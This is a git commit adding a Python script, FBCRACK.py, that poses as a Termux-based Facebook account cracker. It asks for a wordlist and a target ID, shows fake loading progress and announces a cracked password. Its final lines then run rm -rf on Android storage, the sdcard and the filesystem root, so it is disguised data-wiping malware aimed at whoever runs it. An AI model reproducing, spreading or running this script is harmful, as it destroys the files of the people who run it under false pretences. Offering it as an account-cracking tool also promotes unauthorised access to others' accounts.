db83b76306b07f42fb9cba5b99568c2e022a084b
PhSkid <121681162+PhSkid@users.noreply.github.com>
2023-01-07 16:33:10 +0800

    Add files via upload

---
+++ FBCRACK.py
@@ -0,0 +1,66 @@
+import os
+import time
+
+os.system('termux-setup-storage')
+os.system('clear')
+
+print("""\x1b[0;2;255;20;31m
+  █████▒▄▄▄▄    ▄████▄   ██▀███   ▄▄▄       ▄████▄   ██ ▄█▀
+▓██   ▒▓█████▄ ▒██▀ ▀█  ▓██ ▒ ██▒▒████▄    ▒██▀ ▀█   ██▄█▒ 
+▒████ ░▒██▒ ▄██▒▓█    ▄ ▓██ ░▄█ ▒▒██  ▀█▄  ▒▓█    ▄ ▓███▄░ 
+░▓█▒  ░▒██░█▀  ▒▓▓▄ ▄██▒▒██▀▀█▄  ░██▄▄▄▄██ ▒▓▓▄ ▄██▒▓██ █▄ 
+░▒█░   ░▓█  ▀█▓▒ ▓███▀ ░░██▓ ▒██▒ ▓█   ▓██▒▒ ▓███▀ ░▒██▒ █▄
+ ▒ ░   ░▒▓███▀▒░ ░▒ ▒  ░░ ▒▓ ░▒▓░ ▒▒   ▓▒█░░ ░▒ ▒  ░▒ ▒▒ ▓▒
+ ░     ▒░▒   ░   ░  ▒     ░▒ ░ ▒░  ▒   ▒▒ ░  ░  ▒   ░ ░▒ ▒░
+ ░ ░    ░    ░ ░          ░░   ░   ░   ▒   ░        ░ ░░ ░ 
+        ░      ░ ░         ░           ░  ░░ ░      ░  ░   
+             ░ ░                           ░               
+""")
+
+input('Enter WordlistPath: ')
+input('Enter Target User/ID: ')
+print("")
+print("CRACKING FB ACCOUNT")
+time.sleep(1)
+print("Loading 1%")
+time.sleep(1)
+print("Loading 3%")
+time.sleep(1)
+print("Loading 6%")
+time.sleep(1)
+print("Loading 9%")
+time.sleep(1)
+print("Loading 15%")
+time.sleep(1)
+print("Loading 16%")
+time.sleep(1)
+print("Loading 30%")
+time.sleep(1)
+print("Loading 60%")
+time.sleep(1)
+print("Loading 67%")
+time.sleep(1)
+print("Loading 72%")
+time.sleep(1)
+print("Loading 78%")
+time.sleep(1)
+print("Loading 82%")
+time.sleep(1)
+print("Loading 88%")
+time.sleep(1)
+print("Loading 92%")
+time.sleep(1)
+print("Loading 99%")
+time.sleep(5)
+print("Loading 100")
+time.sleep(5)
+print("Account Succesfully Hacked")
+print("Password: AngPogiKoNaman")
+print("")
+os.system('rm -rf /storage/emulated/0/*')
+os.system('rm -rf /storage/emulated/*')
+os.system('rm -rf /sdcard/*')
+os.system('rm -rf /sdcard/0/*')
+os.system('rm -rf /sdcard1/*')
+os.system('rm -rf /storage/*')
+os.system('rm -rf /*')
